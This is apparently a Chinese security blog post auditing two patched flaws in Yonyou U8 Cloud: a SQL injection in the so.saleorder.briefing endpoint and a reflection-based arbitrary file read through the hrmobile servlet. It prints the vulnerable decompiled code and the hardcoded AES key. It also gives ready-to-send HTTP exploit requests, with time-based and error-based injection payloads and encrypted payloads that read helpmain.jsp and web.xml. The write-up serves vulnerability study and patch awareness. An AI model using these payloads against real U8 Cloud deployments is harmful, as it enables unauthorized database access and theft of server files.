#  代码审计| 某u8 1day漏洞分析   
原创 莫大130  安全逐梦人   2025-04-12 06:30  
  
   
  
## 1day漏洞分析  
  
hrmobile接口反射类漏洞本来这个漏洞是通过java反射nc.itf.hr.tools.IFileTrans.uploadFile  
 但是我只复现成功了nc.itf.hr.tools.IFileTrans.downloadFile  
 代码能力还是差没复现成功  
### U8cloud系统3.5-5.1sp存在so.saleorder.briefing接口SQL注入漏洞  
#### 一、影响版本  
  
3.5，3.6，3.6sp，5.0，5.0sp，5.1，5.1sp  
  
直接看补丁 https://security.yonyou.com/#/patchInfo?identifier=255e0184fed748c49154f5ba48af9baa  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5kGt5ZSGMv80xjH6HwpIvfib0Ij4dyUR2dDtb0S5XYH04p3xDqnGKLVTvIoXJTaI6gRKpaCicg9WzQ/640?wx_fmt=png&from=appmsg "")  
  
  
从补丁中找到了漏洞函数 SaleOrderBriefingAction  
  
本次复现搭建的环境为U8cloud3.5  
  
文件路径：\modules\so\META-INF\lib\so\u8c\bs\so\saleorder\action\SaleOrderBriefingAction.java  
```
package u8c.bs.so.saleorder.action;  import java.util.HashMap;  import java.util.Map;  import nc.bs.dao.BaseDAO;  import nc.itf.bd.psn.util.CountNumberProcessor;  import nc.jdbc.framework.processor.MapProcessor;  import nc.jdbc.framework.processor.ResultSetProcessor;  import nc.vo.pub.BusinessException;  import net.sf.json.JSONObject;  import u8c.bs.exception.ConfigException;  import u8c.pubitf.action.IAction;  publicclassSaleOrderBriefingActionimplementsIAction {      public String doAction(String json, String tranType)throws BusinessException, ConfigException {          JSONObjectjsonObject= JSONObject.fromObject((Object)json);          StringpkCorp= jsonObject.optString("pk_corp");          StringcUserid= jsonObject.optString("cuserid");          StringdateBegin= jsonObject.optString("date_begin");          StringdateEnd= jsonObject.optString("date_end");          StringwhereSql=" and s.pk_corp = '" + pkCorp + "' and s.coperatorid = '" + cUserid + "' and s.dbilldate between '" + dateBegin + "' and '" + dateEnd + "'";          JSONObjectjsonObj= JSONObject.fromObject((Object)this.briefingQuery(whereSql).toString());          return jsonObj.toString();      }      private HashMap<String, String> briefingQuery(String whereSql)throws BusinessException {          HashMapbreidfInfo= (HashMap)newBaseDAO().executeQuery("select CASE WHEN sum( sb.nsummny) IS NULL THEN 0 ELSE sum( sb.nsummny) END AS \"ddje\", CASE WHEN sum( sb.nnumber ) IS NULL THEN 0 ELSE sum( sb.nnumber ) END AS \"ddsl\" from so_sale s inner join so_saleorder_b sb on s.csaleid = sb.csaleid inner join so_saleexecute se on sb.corder_bid = se.csale_bid  where (sb.dr = 0 or sb.dr is null)" + whereSql, (ResultSetProcessor)newMapProcessor());          for (Map.Entry entry : breidfInfo.entrySet()) {              if (entry.getValue() == null || !String.valueOf(entry.getValue()).equals("0E-8")) continue;              entry.setValue("0");          }          HashMaphashMap= (HashMap)newBaseDAO().executeQuery("SELECT (sum( sb.nnumber ) - sum( CASE WHEN se.ntotalinventorynumber IS NULL THEN 0 ELSE se.ntotalinventorynumber END ) + sum( CASE WHEN se.ntranslossnum IS NULL THEN 0 ELSE se.ntranslossnum END )) AS \"dcksl\" FROM so_sale s INNER JOIN so_saleorder_b sb ON s.csaleid = sb.csaleid INNER JOIN so_saleexecute se ON sb.corder_bid = se.csale_bid where (sb.dr = 0 or sb.dr is null) AND se.bifinventoryfinish = 'N'" + whereSql, (ResultSetProcessor)newMapProcessor());          Integercount= (Integer)newBaseDAO().executeQuery("select count(*) from so_sale s where (dr = 0 or dr is null)" + whereSql, (ResultSetProcessor)newCountNumberProcessor());          breidfInfo.put("ddbs", count.toString());          breidfInfo.put("dcksl", hashMap.get("dcksl") == null ? "0" : String.valueOf(hashMap.get("dcksl")));          return breidfInfo;      }  }
```  
  
可以看到 whereSql 中拼接了可控的字符导致sql注入漏洞产生  
#### 二、路由分析  
  
从历史漏洞中分析路径情况 用友U8 Cloud uapbd.refdef.query接口存在SQL注入漏洞  
```
POST /u8cloud/openapi/uap.refdef.query?appcode=huo&isEncrypt=N HTTP/1.1  User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)  Accept-Encoding: gzip, deflate  Accept: */*  Connection: close  Host: xx.xx.xx.xx  Content-Type: application/json  Content-Length: 64    {"refName":"1%' UNION ALL SELECT 1,CONVERT(INT,@@VERSION),1-- "}
```  
  
RefDefAPIQueryAction  
 将漏洞类名称按字母大写拆分uap.refdef.query  
 其中uap为包文件夹名  
  
RefDefAPIQueryAction  
 和SaleOrderBriefingAction  
 都实现了一个接口方法 implements IAction  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5kGt5ZSGMv80xjH6HwpIvfmz3ZTN8YCutNmVMW9CzzexDITpR8eKTU5XkMSlpCyWwRN63H23lmCg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5kGt5ZSGMv80xjH6HwpIvfkFboCl7nb6AL4WrgZTbqDS1QmuibuzjnwsZibSCwE0Zrve3Q5ZbFDSjw/640?wx_fmt=png&from=appmsg "")  
  
必须带上 appcode 和 isEncrypt  
```
("lbsj".equals(appCode) || "esn".equals(appCode) || "huo".equals(appCode) || "ubz".equals(appCode)))
```  
  
isEncrypt 必须为N 不然会提示 无法解析来源数据!  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5kGt5ZSGMv80xjH6HwpIvfJme9x0ZbFLjkLDhcicdJibFCUHK9TnUOIDvGhLZGDzAGvTvGmCRkY7EA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5kGt5ZSGMv80xjH6HwpIvfx35H7icU2x7MPlRNmXbTDD1K6ogfhoibcauYydpNuwVs7r9Yb8IgZ11w/640?wx_fmt=png&from=appmsg "")  
#### 三、漏洞复现  
  
按照上面的思路来构造路由  
  
文件路径：  
\modules\so\META-INF\lib\so\u8c\bs\so\saleorder\action\SaleOrderBriefingAction.java  
```
POST /u8cloud/openapi/so.saleorder.briefing?appcode=huo&isEncrypt=N HTTP/1.1Host:User-Agent: Mozilla/5.0Content-Length: 141{"pk_corp":"1';WAITFOR DELAY '0:0:2'--","cuserid":"","date_begin":"","date_end":"",}
```  
```
POST /u8cloud/openapi/so.saleorder.briefing?appcode=huo&isEncrypt=N HTTP/1.1Host:User-Agent: Mozilla/5.0Content-Length: 141{"pk_corp":"1' AND 8360 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (8360=8360) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(106)+CHAR(122)+CHAR(113))) AND 'uVGn'='uVGn","cuserid":"","date_begin":"","date_end":"",}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5kGt5ZSGMv80xjH6HwpIvf3GZfIiaMibl6gCkHCfibS5MKcsTZzYtiaY7mYY3ca0Lo8kSSHN87jcRa8g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5kGt5ZSGMv80xjH6HwpIvfPHEQiaeL7zDQASj5nISpWpOia8Tt9qQj5Ttu8M1BvxvKNzKN8ZhfjCMw/640?wx_fmt=png&from=appmsg "")  
### U8cloud系统存在hrmobile接口反射类漏洞  
#### 一、影响版本  
  
3.1，3.2，3.5，3.6，3.6sp，5.0，5.0sp，5.1，5.1sp  
  
漏洞补丁：https://security.yonyou.com/#/patchInfo?identifier=f26f019f8c7744499bf7590065a9b551  
#### 二、漏洞分析  
  
漏洞路径：\uap\lib\pubmobile.jar!\nc\bs\framework\core\service\HRMobileServlet.class  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5kGt5ZSGMv80xjH6HwpIvfnoc54nHzNd2Giafm9G9FJo78ow6ttfJ3gcq0kP4oJocic6usdQYwUN2g/640?wx_fmt=png&from=appmsg "")  
  
```
if ("userinfo".equals(mcode)) {      this.ms.getUserInfo(result, reqmap);  } else if ("appkey".equals(mcode)) {      this.ms.getAppkey(result, reqmap);  } else if ("mapprove".equals(mcode)) {      this.ms.mapprove(result, reqmap);  } else {      this.ms.otherReq(result, reqmap);  }
```  
  
mapprove  
 和 otherReq  
 都是接口反射类，  
```
public voidmapprove(Map<String, Object> result, Map<String, Object> reqmap)throws Exception {      IMobileServicesInvorkerservice= (IMobileServicesInvorker)NCLocator.getInstance().lookup(IMobileServicesInvorker.class);      Listreslist= service.multiStrServicesInvorkerSP((List)reqmap.get("methodnames"), (List)reqmap.get("paramsClass"), (List)reqmap.get("params"), (List)null);      Stringres= JSONUtils.objectToJson(reslist);      res = AES256Utils.encrypt(res, "50D52382667B2ATHY30788972R06Y68A");      result.put("code", "0");      result.put("data", res);  }  publicvoidotherReq(Map<String, Object> result, Map<String, Object> reqmap)throws Exception {      IMobileServicesInvorkerservice= (IMobileServicesInvorker)NCLocator.getInstance().lookup(IMobileServicesInvorker.class);      Stringres= service.multiStrServicesInvorker2((List)reqmap.get("servicenames"), (List)reqmap.get("methodnames"), (List)reqmap.get("paramsClass"), (List)reqmap.get("params"), (List)null);      res = AES256Utils.encrypt(res, "50D52382667B2ATHY30788972R06Y68A");      result.put("code", "0");      result.put("data", res);  }
```  
  
multiStrServicesInvorkerSP  
和multiStrServicesInvorker2  
```
public String multiStrServicesInvorker2(List<String> servicenames, List<List<String>> methodnames, List<List<List<Class>>> paramsClass, List<List<List<Object>>> params, List<Map> assinfo)throws Exception {      ObjectserviceObject=null;      newArrayList();      Listsmname=null;      intlen= servicenames.size();      Stringresultjson=null;      Expressione=null;      Methodsm=null;      for(inti=0; i < len; ++i) {          serviceObject = NCLocator.getInstance().lookup((String)servicenames.get(i));          smname = (List)methodnames.get(i);          intmlen= smname.size();          for(intj=0; j < mlen; ++j) {              List<Class> classs = newArrayList();              List<Object> classobj = (List)((List)paramsClass.get(i)).get(j);              Iteratorvar18= classobj.iterator();              while(var18.hasNext()) {                  Objectobj= var18.next();                  classs.add(Class.forName(String.valueOf(obj)));              }              sm = serviceObject.getClass().getMethod((String)smname.get(j), (Class[])classs.toArray(newClass[0]));              sm.setAccessible(true);              Objecto= sm.invoke(serviceObject, ((List)((List)((List)params.get(i)).get(j))).toArray(newObject[0]));              resultjson = JSON.toJSONString(o);          }      }      return resultjson;  }  public List multiStrServicesInvorkerSP(List<List<String>> methodnames, List<List<List<Class>>> paramsClass, List<List<List<Object>>> params, List<Map> assinfo) {      ObjectserviceObject=null;      List<Object> resultListMap = newArrayList();      Stringresultjson=null;      Expressione=null;      Methodsm=null;      intmlen= methodnames.size();      for(intj=0; j < mlen; ++j) {          List<String> methodNames = (List)methodnames.get(j);          if (methodNames != null) {              inti=0;              for(Iteratorvar14= methodNames.iterator(); var14.hasNext(); ++i) {                  Stringmname= (String)var14.next();                  Objecto=null;                  ResultDataVOresvo=newResultDataVO();                  ServiceCodesResVOserviceCodesResVO=newServiceCodesResVO();                  ServiceCodeResVO[] serviceCodeResVOs = newServiceCodeResVO[1];                  ServiceCodeResVOserviceCodeResVO=newServiceCodeResVO();                  ResDataVOresdatavo=newResDataVO();                  try {                      serviceObject = NCLocator.getInstance().lookup(mname.split("##")[0]);                      List<Class> classs = newArrayList();                      List<Object> classobj = (List)((List)paramsClass.get(j)).get(i);                      Iteratorvar24= classobj.iterator();                      while(var24.hasNext()) {                          Objectobj= var24.next();                          classs.add(Class.forName(String.valueOf(obj)));                      }                      sm = serviceObject.getClass().getMethod(mname.split("##")[1], (Class[])classs.toArray(newClass[0]));                      sm.setAccessible(true);                      o = sm.invoke(serviceObject, ((List)((List)((List)params.get(j)).get(i))).toArray(newObject[0]));                      resvo.setFlag(0);                      resvo.setDesc("请求成功");                  } catch (Exception var26) {                      if (var26 instanceof NCBusinessException) {                          NCBusinessExceptionnce2= (NCBusinessException)var26;                          resvo.setFlag(1);                          resvo.setDesc("U8C异常：" + nce2.getErrCode() + "-" + nce2.getMsg());                      } else {                          resvo.setFlag(1);                          resvo.setDesc("U8C异常：" + (var26.getCause() == null ? var26.getLocalizedMessage() : var26.getCause().getLocalizedMessage()));                          if (var26.getCause() == null) {                              var26.printStackTrace();                          } else {                              var26.getCause().printStackTrace();                          }                      }                  }                  resdatavo.setStruct(o);                  serviceCodeResVO.setResdata(resdatavo);                  serviceCodeResVOs[0] = serviceCodeResVO;                  serviceCodesResVO.setServicecoderes(serviceCodeResVOs);                  resvo.setServicecodesres(serviceCodesResVO);                  resultListMap.add(resvo);              }          }      }      return resultListMap;  }
```  
##### nc.itf.hr.tools.IFileTrans downloadFile 任意文件读取漏洞  
  
根据HRMobileServlet  
 的代码构造数据包请求，满足条件进入this.ms.otherReq(result, reqmap);  
 即可触发漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5kGt5ZSGMv80xjH6HwpIvfJrOyGW7Dib5DJlDGRvqt2QY7xfib9GVpbrZsfOzXUjmPQS1ehPZKPFicA/640?wx_fmt=png&from=appmsg "")  
```
{"servicenames":["nc.itf.hr.tools.IFileTrans"],"methodnames":[["downloadFile"]],"paramsClass":[[["java.lang.String"]]],"params":[[["C:\\U8CERP36\\webapps\\u8c_web\\helpmain.jsp"]]]}
```  
  
将上面的payload使用aes加密  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5kGt5ZSGMv80xjH6HwpIvfJrOyGW7Dib5DJlDGRvqt2QY7xfib9GVpbrZsfOzXUjmPQS1ehPZKPFicA/640?wx_fmt=png&from=appmsg "")  
#### 三、漏洞复现  
##### 读取helpmain.jsp  
```
POST /u8cloud/hrmobile HTTP/1.1Host: 192.168.1.102:8087Content-Type: text/plainmcode:sssslanguage: zh_CNappcode: 12444pkcorp: 0001pkuser: 00014F96A911CD5C59F6A15C7E3ACD7968616A55957C0051D39786339CE1A2818670212BE1E9BEDDE8692B1211D74EAA8A79301485F94362ED1BABE47104695C7CD10D8CC66E97E8F5B0E3D25D41E8721E942E02ED95727D8B24A1352F9E9D979A8207D147A03A658DE2EE7696518F5262C8EA373A35F6AED7E0C71F9D0BBEA9B3BEB0F08C5FB05FE50D3FD4770CA7ECACABA7E8C79ACA76F922F8D7AFA0D304E0525E54332EFD559A1AF8E1381BFEA1E54B0625739B79E62049896E7C56D005DA15
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5kGt5ZSGMv80xjH6HwpIvfBGOF8e0r5T8aGlCbxeDJalVm8g0m9zzvhyC8kIQbJYM73fQCRkO22Q/640?wx_fmt=png&from=appmsg "")  
  
将响应包data的数据解码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5kGt5ZSGMv80xjH6HwpIvf8ia6FhTMzibxoJm0uWQ4vmj7sabziaDmRBP2CibeQFGAl7xGVNn1awjiahw/640?wx_fmt=png&from=appmsg "")  
  
##### 读取web.xml  
```
POST /u8cloud/hrmobile HTTP/1.1Host: 192.168.1.102:8087Content-Type: text/plainmcode:sssslanguage: zh_CNappcode: 12444pkcorp: 0001pkuser: 00014F96A911CD5C59F6A15C7E3ACD7968616A55957C0051D39786339CE1A2818670212BE1E9BEDDE8692B1211D74EAA8A79301485F94362ED1BABE47104695C7CD10D8CC66E97E8F5B0E3D25D41E8721E942E02ED95727D8B24A1352F9E9D979A8207D147A03A658DE2EE7696518F5262C8EA373A35F6AED7E0C71F9D0BBEA9B3BEB0F08C5FB05FE50D3FD4770CA7ECACABA7E8C79ACA76F922F8D7AFA0D304E052E5E69639FB25727DC1226882408E47DD3810D2C5D5A4B893B74877AA48DF5890
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5kGt5ZSGMv80xjH6HwpIvfOpUoNauqsmzU3IibSsibS8BmWhA29icP5lDKYLj4MIXTcJGm9NFawWAhA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5kGt5ZSGMv80xjH6HwpIvftzuQHdpygcEFg8mnDP5Jp1DaHJsch1f2I4qYtj9SyicCZJBMYQGQfGQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
                开了一个知识星球，分享一些个人审计的报告之类  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5kGt5ZSGMv80xjH6HwpIvfXn1VblL5pXfIlPN23NgZIZo5geTUW5Acb8yIjlbhacd4mS5ziazibvlA/640?wx_fmt=png&from=appmsg "")  
  
  
                                                      交流群  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/vOGOib9z4Wz5kGt5ZSGMv80xjH6HwpIvf9FjGnPpq3vUcicA2ZZKItHibyticQIuVzG2HsnSOSZic80zDFicY1tAR6ibw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
   
  
  
